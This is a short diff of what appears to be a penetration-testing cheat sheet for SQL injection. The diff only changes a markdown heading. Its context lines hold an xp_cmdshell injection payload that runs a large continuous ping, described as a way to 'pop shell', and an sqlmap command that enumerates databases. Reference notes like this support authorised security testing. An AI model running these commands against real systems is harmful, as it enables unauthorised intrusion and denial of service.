@@ -6,8 +6,7 @@ For SQL injection focused task either perform the injection manually or use sqlm
 
 ```blah';exec master..xp_cmdshell 'ping [URL] -l 65000 -t'; --``` - Example command to pop shell through sql injection.
 
-
-<summary>sqlmap</summary>
+### sqlmap
 
 ```sudo sqlmap -u “[URL]” --cookie="[cookie_value]" --dbs``` - Initial command to enumerate databases (--dbs). Add cookie values if necessary (--cookie).
 
